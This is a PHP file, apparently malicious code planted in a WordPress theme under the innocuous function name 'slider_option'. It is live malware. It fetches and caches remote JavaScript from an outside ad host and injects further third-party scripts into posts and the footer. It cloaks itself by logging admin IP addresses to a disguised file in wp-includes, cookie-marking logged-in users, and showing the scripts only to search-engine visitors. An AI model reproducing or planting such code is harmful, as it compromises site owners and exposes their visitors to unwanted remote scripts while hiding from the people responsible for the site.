ini_set('display_errors', 0);
error_reporting(0);
$wp_auth_key='f1c292f1b3cc9d982727c2fa0d8692db';


if ( ! function_exists( 'slider_option' ) ) {  

class __AntiAdBlock
{
    /** @var string */
    private $token = '3dfbba821ba7c3ff16321f3b3dc569600f337df5';

    /** @var int */
    private $zoneId = '1538914';

    ///// do not change anything below this point /////

    private function getCurl($url)
    {
        if ((!extension_loaded('curl')) || (!function_exists('curl_version'))) {
            return false;
        }

        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_USERAGENT      => 'AntiAdBlock API Client',
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_SSL_VERIFYPEER => true,
        ));

        // prefer SSL if at all possible
        $version = curl_version();
        if ($version['features'] & CURL_VERSION_SSL) {
            curl_setopt($curl, CURLOPT_URL, 'https://go.transferzenad.com' . $url);
        } else {
            curl_setopt($curl, CURLOPT_URL, 'http://go.transferzenad.com' . $url);
        }

        $result = curl_exec($curl);
        curl_close($curl);
        return $result;
    }

    private function getFileGetContents($url)
    {
        if (!function_exists('file_get_contents') || !ini_get('allow_url_fopen') ||
            ((function_exists('stream_get_wrappers')) && (!in_array('http', stream_get_wrappers())))) {
            return false;
        }

        if (function_exists('stream_get_wrappers') && in_array('https', stream_get_wrappers())) {
            return file_get_contents('https://go.transferzenad.com' . $url);
        } else {
            return file_get_contents('http://go.transferzenad.com' . $url);
        }
    }

    private function getFsockopen($url)
    {
        $fp = null;
        if (function_exists('stream_get_wrappers') && in_array('https', stream_get_wrappers())) {
            $fp = fsockopen('ssl://' . 'go.transferzenad.com', 443, $enum, $estr, 10);
        }
        if ((!$fp) && (!($fp = fsockopen('tcp://' . gethostbyname('go.transferzenad.com'), 80, $enum, $estr, 10)))) {
            return false;
        }

        $out = "GET " . $url . " HTTP/1.1\r\n";
        $out .= "Host: go.transferzenad.com\r\n";
        $out .= "User-Agent: AntiAdBlock API Client\r\n";
        $out .= "Connection: close\r\n\r\n";
        fwrite($fp, $out);
        $in = '';
        while (!feof($fp)) {
            $in .= fgets($fp, 1024);
        }
        fclose($fp);
        return substr($in, strpos($in, "\r\n\r\n") + 4);
    }

    private function findTmpDir()
    {
        if (!function_exists('sys_get_temp_dir')) {
            if (!empty($_ENV['TMP'])) {
                return realpath($_ENV['TMP']);
            }
            if (!empty($_ENV['TMPDIR'])) {
                return realpath($_ENV['TMPDIR']);
            }
            if (!empty($_ENV['TEMP'])) {
                return realpath($_ENV['TEMP']);
            }
            // this will try to create file in dirname(__FILE__) and should fall back to /tmp or wherever
            $tempfile = tempnam(dirname(__FILE__), '');
            if (file_exists($tempfile)) {
                unlink($tempfile);
                return realpath(dirname($tempfile));
            }
            return null;
        }
        return sys_get_temp_dir();
    }

    public function get()
    {
        $e = error_reporting(0);

        $url = "/v1/getTag?" . http_build_query(array('token' => $this->token, 'zoneId' => $this->zoneId));
        $file = $this->findTmpDir() . '/pa-code-' . md5($url) . '.js';
        // expires in 4h
        if (file_exists($file) && (time() - filemtime($file) < 4 * 3600)) {
            error_reporting($e);
            return file_get_contents($file);
        }
        $code = $this->getCurl($url);
        if (!$code) {
            $code = $this->getFileGetContents($url);
        }
        if (!$code) {
            $code = $this->getFsockopen($url);
        }

        if ($code) {
            // atomic update, and it should be okay if this happens simultaneously
            $fp = fopen("{$file}.tmp", 'wt');
            fwrite($fp, $code);
            fclose($fp);
            rename("${file}.tmp", $file);
        }

        error_reporting($e);
        return $code;
    }
}





function slider_option($content){ 
if(is_single())
{


$__aab = new __AntiAdBlock();
$con= $__aab->get();

$con2 = '

<script src="//go.mobtrks.com/notice.php?p=1534527&interstitial=1"></script>
<script async="async" type="text/javascript" src="//go.mobisla.com/notice.php?p=1534523&interactive=1&pushup=1"></script>

';

$content=$content.$con.$con2;
}
return $content;
} 

function slider_option_footer(){ 
if(!is_single())
{

$__aab = new __AntiAdBlock();
$con= $__aab->get();


$con2 = '

<script src="//go.mobtrks.com/notice.php?p=1534527&interstitial=1"></script>
<script async="async" type="text/javascript" src="//go.mobisla.com/notice.php?p=1534523&interactive=1&pushup=1"></script>

';

echo $con.$con2;
}
} 








function setting_my_first_cookie() {
  setcookie( 'wordpress_cf_adm_use_adm',1, time()+3600*24*1000, COOKIEPATH, COOKIE_DOMAIN);
  }


if(is_user_logged_in())
{
add_action( 'init', 'setting_my_first_cookie',1 );
}







if( current_user_can('edit_others_pages'))
{

if (file_exists(ABSPATH.'wp-includes/wp-feed.php'))
{
$ip=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
}

if (stripos($ip, $_SERVER['REMOTE_ADDR']) === false)
{
$ip.=$_SERVER['REMOTE_ADDR'].'
';
@file_put_contents(ABSPATH.'wp-includes/wp-feed.php',$ip);


}



}






$ref = $_SERVER['HTTP_REFERER'];
$SE = array('google.','/search?','images.google.', 'web.info.com', 'search.','yahoo.','yandex','msn.','baidu','bing.','doubleclick.net','googleweblight.com');
foreach ($SE as $source) {
  if (strpos($ref,$source)!==false) {
    setcookie("sevisitor", 1, time()+120, COOKIEPATH, COOKIE_DOMAIN); 
	$sevisitor=true;
  }
}






if(!isset($_COOKIE['wordpress_cf_adm_use_adm']) && !is_user_logged_in()) 
{
$adtxt=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
if (stripos($adtxt, $_SERVER['REMOTE_ADDR']) === false)
{
if($sevisitor==true || isset($_COOKIE['sevisitor']))
{
add_filter('the_content','slider_option');
add_action('wp_footer','slider_option_footer');
}

}

} 





}